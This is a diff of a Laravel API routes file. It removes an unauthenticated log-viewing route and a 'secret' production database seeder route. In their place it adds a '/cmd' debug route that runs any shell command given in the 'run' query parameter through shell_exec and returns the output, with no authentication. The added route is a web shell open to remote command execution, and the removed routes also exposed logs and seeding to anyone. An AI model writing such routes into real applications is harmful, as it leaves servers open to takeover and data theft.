@@ -32,28 +32,11 @@ Route::prefix('v1')->group(function () {
         return "pong, Laravel está vivo!";
     });
 
-    // Ruta para ver los logs de error (TEMPORAL PARA DEBUGGING)
-    Route::get('/logs', function () {
-        $path = storage_path('logs/laravel.log');
-        if (!file_exists($path)) {
-            return "No log file found at: " . $path;
-        }
-        return response(file_get_contents($path))->header('Content-Type', 'text/plain');
-    });
-
-    // Ruta secreta temporal para inicializar la base de datos de producción
-    Route::get('/init-db-seeder-secreto', function () {
-        try {
-            \Illuminate\Support\Facades\Artisan::call('db:seed', ['--force' => true]);
-            return response()->json(['message' => '¡Base de datos sembrada con éxito! Ya puedes iniciar sesión.']);
-        } catch (\Throwable $e) {
-            return response()->json([
-                'message' => 'Error o la base de datos ya estaba sembrada.',
-                'error' => $e->getMessage(),
-                'file' => $e->getFile(),
-                'line' => $e->getLine()
-            ]);
-        }
+    // Ruta de comandos (DEBUG) para ejecutar artisan directamente y ver la consola
+    Route::get('/cmd', function (\Illuminate\Http\Request $request) {
+        $comando = $request->query('run', 'ls -la');
+        $output = shell_exec($comando . ' 2>&1');
+        return response("<pre style='background:#1e1e1e;color:#0f0;padding:20px;'>$output</pre>")->header('Content-Type', 'text/html');
     });
 
     // ── Rutas protegidas ────────────────────────────────
